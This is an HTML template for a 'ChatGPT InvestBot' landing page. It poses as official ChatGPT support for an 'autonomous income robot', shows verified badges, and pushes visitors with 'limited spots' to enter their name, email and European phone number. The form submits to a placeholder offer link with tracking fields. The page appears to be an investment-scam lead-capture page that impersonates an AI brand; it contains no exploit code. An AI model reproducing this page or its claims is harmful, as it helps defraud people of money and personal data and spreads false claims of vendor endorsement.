<!doctype html>
<html lang="en-US">
<head>
    <meta name="robots" content="noindex, nofollow" />

    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta content="IE=edge" http-equiv="X-UA-Compatible" />
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    <meta http-equiv="Cache-Control" content="no-cache" />

    <title>ChatGPT InvestBot</title>

    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" href="./chat/css/main.css" />
    <link rel="stylesheet" href="./chat/css/form.css" />

    <link rel="stylesheet" href="./chat/css/flags.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

    <link rel="stylesheet" href="./form/css/form.css" />
    <script>
        function setCookie(cname, cvalue, exdays) {
          const d = new Date();
          d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
          let expires = "expires="+d.toUTCString();
          document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
      }

      function getCookie(cname) {
          let name = cname + "=";
          let ca = document.cookie.split(';');
          for(let i = 0; i < ca.length; i++) {
            let c = ca[i];
            while (c.charAt(0) == ' ') {
              c = c.substring(1);
          }
          if (c.indexOf(name) == 0) {
              return c.substring(name.length, c.length);
          }
      }
      return "";
  }
</script>

<style>

@keyframes subtle-float {
  0%, 100% { transform: translateY(0); }
  50%      { transform: translateY(-14px); }
}

.header{
    z-index: 999;
}

.form-input,
._phone {
  width: 100%;
  padding: 16px 18px;
  font-size: 1.1rem;
  background: rgba(255,255,255,0.05);
  border: 1px solid var(--border);
  border-radius: 14px;
  color: var(--text-primary);
  transition: var(--transition);
}

.form-input:focus,
._phone:focus {
  outline: none;
  border-color: var(--accent);
  box-shadow: 0 0 0 4px var(--accent-glow);
  background: rgba(255,255,255,0.09);
}

.form-input::placeholder,
._phone::placeholder {
  color: var(--text-muted);
}

/* Кнопки Next / Proceed */
.button--user,
.buttonSend {
  width: 100%;
  max-width: 360px;
  margin: 1.8rem auto 0;
  padding: 16px 28px;
  font-size: 1.14rem;
  font-weight: 600;
  letter-spacing: -0.01em;
  color: white;
  background: linear-gradient(135deg, var(--accent) 0%, var(--accent-dark) 100%);
  border: none;
  border-radius: 14px;
  cursor: pointer;
  box-shadow: 0 12px 32px var(--accent-glow);
  transition: var(--transition);
}

.button--user:hover,
.buttonSend:hover {
  transform: translateY(-4px) scale(1.015);
  box-shadow: 0 18px 44px var(--accent-glow-strong);
}

.buttonSend {
  font-size: 1.24rem;
  padding: 20px 36px;
  margin-top: 3rem;
}

/* ==========================================================================
   Правая панель (Support / Информация)
   ========================================================================== */
.main__sup {
background: var(--bg-glass);
    backdrop-filter: blur(22px);
    border-left: 1px solid var(--border);
    padding: 2.4rem 1.8rem;

}

.main__sup-title {
  font-size: 1.58rem;
  font-weight: 700;
  margin-bottom: 1.1rem;
  display: flex;
  align-items: center;
  gap: 10px;
}

.main__sup-subtitle {
  font-size: 1.04rem;
  color: var(--text-secondary);
  line-height: 1.48;
}

/* ==========================================================================
   Время сообщений и другие мелкие элементы
   ========================================================================== */
.message-time {
  font-size: 0.84rem;
  color: var(--text-muted);
  margin: -2.4rem auto 2rem;
  display: block;
  text-align: center;
  width: fit-content;
  padding: 5px 14px;
  background: rgba(0,0,0,0.45);
  border-radius: var(--radius-pill);
}

/* ==========================================================================
   Адаптивность
   ========================================================================== */
@media (max-width: 901px) {
  .main__sup {
    display: none;
  }
  
  .chat {
    padding: 90px 16px 180px;
  }
}

@media (max-width: 480px) {
  .header__desc-title {
    font-size: 1.32rem;
  }
  
  .chat-content-desc-item {
    font-size: 1.05rem;
    padding: 12px 16px;
  }
  
  .buttonSend {
    font-size: 1.12rem;
    padding: 16px 30px;
  }
  
  .form-input {
    font-size: 1.05rem;
    padding: 14px 16px;
  }
}

/* ==========================================================================
   Скроллбар (тонкий, современный)
   ========================================================================== */
::-webkit-scrollbar {
  width: 7px;
}

::-webkit-scrollbar-track {
  background: transparent;
}

::-webkit-scrollbar-thumb {
  background: rgba(100, 116, 139, 0.55);
  border-radius: 7px;
}

::-webkit-scrollbar-thumb:hover {
  background: var(--text-muted);
}
</style> 
</head>

<body class="add-scroll">
    <div class="body" style="transform: translateY(0px)">
        <div class="content">
            <div class="header">
                <div class="header__body">
                    <div class="header__name">
                        <div class="header__avatar">
                            <img
                            src="./chat/images/left-bar.png"
                            alt=""
                            style="min-height: 50px; min-width: 50px"
                            />
                        </div>
                        <div class="header__desc">
                            <div class="header__desc-title">
                                <p>ChatGPT InvestBot</p>
                                <img src="./chat/images/meta-done.png" alt="" />
                            </div>
                        </div>
                    </div>
                    <div class="header__modal">
                        <button type="button" data-modal-close="">
                            <img src="./land/img/btn-menu.png" alt="" />
                        </button>
                        <p>To contact a specialist, complete the dialog.</p>
                    </div>
                    <div class="header__icons">
                        <button type="button" data-modal=""></button>
                        <div style="cursor: pointer">
                            <img
                            src="./chat/images/write-gpt.png"
                            alt=""
                            style="max-height: 50px; max-width: 50px"
                            />
                        </div>
                    </div>
                </div>
            </div>
            <form action="{offer}" id="my-form" class="register-form main-flex form _main-form" >
                <div class="chat">
                    <div class="chat-absolute">
                        <div class="main__sup-logo">
                            <img
                            src="./chat/images/gpt-main-logo.svg"
                            alt=""
                            style="min-height: 100px; min-width: 100px; padding-top: 5%"
                            />
                        </div>
                        <div class="main__sup-subtitle">New chat with InvestBot</div>
                        <p class="message-time">15:12</p>
                    </div>
                    <div class="chat-content-list chat-content-list-1"></div>
                    <div class="user--name">
                        <div class="form-group input-group" style="margin-bottom: 15px">
                            <input
                            class="form-control form-input form__input"
                            name="first_name"
                            placeholder="First Name"
                            type="text"
                            />
                            <i class="fa__err"></i>
                            <span class="fa__errInfo"
                            >- Enter in the specified format <br />
                            - First Name and Last Name should not match</span
                            >
                            <i class="fa__checked"></i>
                        </div>
                        <div class="form-group input-group" style="margin-bottom: 15px">
                            <input
                            class="form-control form-input form__input"
                            name="last_name"
                            placeholder="Last Name"
                            type="text"
                            />
                            <i class="fa__err"></i>
                            <span class="fa__errInfo"
                            >- Enter in the specified format <br />
                            - First Name and Last Name should not match</span
                            >
                            <i class="fa__checked"></i>
                        </div>
                        <button type="button" class="button--user button-name-next" style="" data-btn-name="">
                            Next
                        </button>
                    </div>
                    <div class="chat-content-list chat-content-list-2"></div>
                    <div class="user--email">
                        <div class="form-group input-group" style="margin-bottom: 15px">
                            <input
                            class="form-control form-input form__input"
                            name="email"
                            placeholder="E-mail"
                            type="text"
                            />
                            <i class="fa__err"></i>
                            <span class="fa__errInfo"
                            >- Enter in the specified format <br />
                            - example@gmail.com</span
                            >
                            <i class="fa__checked"></i>
                        </div>
                        <button type="button" class="button--user button-email-next" data-btn-email="">
                            Next
                        </button>
                    </div>
                    <div class="chat-content-list chat-content-list-3"></div>
                    <div class="user--phone">
                        <div class="form-group input-group input-group--phone">
                            <input class="form-control form-input _phone" name="phone" type="tel" />
                            <span class="phone-eror-mess"></span>
                        </div>
                        <input name="code" type="hidden" value="" />
                        <input type="hidden" name="subid" class="js-inputSubid" />
                        <input type="hidden" name="answer" />
                        <button type="button" class="button--user button-phone-next" data-btn-phone="">
                            Next
                        </button>
                    </div>
                    <div class="chat-content-list chat-content-list-4"></div>
                    <div class="form--button hide">
                        <style>
                            .botom__info {
                                margin: 0 auto 20px;
                                border: 3px dashed red;
                                padding: 25px 10px;
                                font-weight: 700;
                                font-size: 22px;
                                text-align: left;
                                z-index: 100;
                                font-size: 18px;
                                color: #000;
                                font-weight: 600;
                            }

                            .botom__info-text {
                                margin-bottom: 8px;
                            }

                            .contr-box {
                                display: flex;
                                font-size: 18px;
                                align-items: center;
                            }

                            .botom__info i {
                                max-width: 50px;
                                margin-right: 5px;
                                flex-shrink: 0;
                            }

                            .botom__img-container {
                                display: flex;
                                flex-wrap: wrap;
                                justify-content: center;
                                gap: 10px;
                            }

                            .fullVideo {
                                position: fixed;
                                top: 0;
                                right: 0;
                                left: 0;
                                bottom: 0;
                                width: 100%;
                                z-index: 1;
                            }
                            .buttonSend {
                                border-radius: 21px;
                                -moz-border-radius: 21px;
                                -ms-border-radius: 21px;
                                -o-border-radius: 21px;
                                border-radius: 21px;
                                text-align: center;
                                text-transform: none;
                                color: #fff;
                                transition: opacity 0.2s ease-out;
                                font-weight: 700;
                                font-size: 20px;
                                cursor: pointer;
                                letter-spacing: -0.05em;
                                text-transform: uppercase;
                                height: 53px;
                                width: 304px;
                                color: #ffffff;
                                border: none;
                                text-shadow: 0px 4px 4px rgba(0, 0, 0, 0.25);
                                display: flex;
                                justify-content: center;
                                align-items: center;
                                margin: 0 auto;
                                /*    background: #0279F1;*/
                                background: rgba(16, 163, 127, 0.75);
                                /*    border: 1px solid #00B1D9;*/
                                border: 1px solid rgb(16, 163, 127);
                            }
                        </style>
                        <button name="submitBtn" class="buttonSend" type="submit" id="main-btn-1">Proceed</button>
                    </div>
                    <div id="down-box"></div>
                </div>
                <div class="main__sup">
                    <div class="main__sup-logo">
                        <img src="./chat/images/gpt-support.png" alt="" />
                    </div>
                    <div class="main__sup-title">
                        <p>ChatGPT Support</p>
                        <img src="./chat/images/meta-done.png" alt="" />
                    </div>
                    <div class="main__sup-subtitle">
                        Official support for the autonomous income robot from ChatGPT
                    </div>
                    <div class="main__sup-btn">
                        <p>Contact a specialist</p>
                        <img src="./chat/images/meta-arrow.png" alt="" />
                    </div>
                    <p class="meta__sup-text">
                        To start using the program, you need to complete the dialog with us!<br /><br />It
                        will take no more than 5 minutes. The number of spots is limited.
                    </p>
                </div>
         <script>
  // Получаем элементы
  const buttonSend = document.querySelector('.buttonSend');
 
  const form = document.querySelector('.register-form');
  const formInput = document.querySelector('.form-input');

  // Добавляем обработчик на кнопку
  buttonSend.addEventListener('click', function() {
  
    if (formInput.classList.contains('valid')) {

      form.submit();
    } else {
     
    }
  });
</script>
            </form>
        </div>
    </div>
    <script>
    const button = document.getElementById('main-btn-1');


const clone = button.cloneNode(true);
button.parentNode.replaceChild(clone, button);
    </script>

    <script src="./chat/js/main.js"></script>

    <!-- intlTelInput -->
    <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/css/intlTelInput.min.css"
    />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/js/intlTelInput.min.js"></script>

    <style>
        .error {
            background-color: rgba(181, 34, 42, 0.5) !important;
            color: #fff !important;
        }

        .error::placeholder {
            color: #fff !important;
        }

        .valid {
            background-color: rgba(16, 163, 127, 0.75) !important;
        }

        .modal_phone {
            opacity: 1;
            position: fixed;
            top: 0;
            bottom: 0;
            right: 0;
            left: 0;
            z-index: 99999;
            display: none;
            outline: 0;
            padding-right: 15px;
            justify-content: center;
            align-items: center;
            background-color: rgba(0, 0, 0, 0.4);
            overflow-x: hidden;
            overflow-y: auto;
            color: #000;
        }

        .modal_phone.open_phone {
            display: flex;
        }

        .modal-open_phone {
            overflow: hidden;
        }

        .modal-dialog_phone {
            position: relative;
            width: 100%;
            max-width: 32rem;
            padding: 1rem;
            box-sizing: border-box;
        }

        .modal-content_phone {
            display: flex;
            flex-direction: column;
            pointer-events: auto;
            background-color: #fff;
            background-clip: padding-box;
            border: 1px solid rgba(0, 0, 0, 0.2);
            border-radius: 0.3rem;
            outline: 0;
        }

        .modal-header_phone {
            display: flex;
            align-items: center;
            padding: 1rem 1rem;
        }

        .modal-header_phone {
            justify-content: space-between;
            border-top-left-radius: 0.3rem;
            border-top-right-radius: 0.3rem;
        }

        .modal-body_phone {
            position: relative;
            flex: 1 1 auto;
            padding: 1rem;
        }

        .modal-title_phone {
            font-size: 1.25rem;
            font-weight: 600;
        }

        .close-button_phone {
            font-size: 1.5rem;
            font-weight: 700;
            line-height: 1;
            opacity: 0.5;
            background-color: transparent;
            border: 0;
            cursor: pointer;
            padding: 1rem 1rem;
            margin: -1rem -1rem -1rem auto;
        }
    </style>

    <div id="modal_phone" class="modal_phone fade_phone" tabindex="-1">
        <div class="modal-dialog_phone">
            <div class="modal-content_phone">
                <div class="modal-header_phone">
                    <h5 class="modal-title_phone">Invalid phone number</h5>
                    <button type="button" class="close-button_phone" id="close-button_phone">×</button>
                </div>
                <div class="modal-body_phone">
                    Sorry! The program is not supported in your region. Please enter your European number
                </div>
            </div>
        </div>
    </div>
 
    <script type="module" src="./form/js/libs.js"></script>
    <script type="module" src="./form/js/main-form.js?v=3ewds"></script>

</body>
</html>
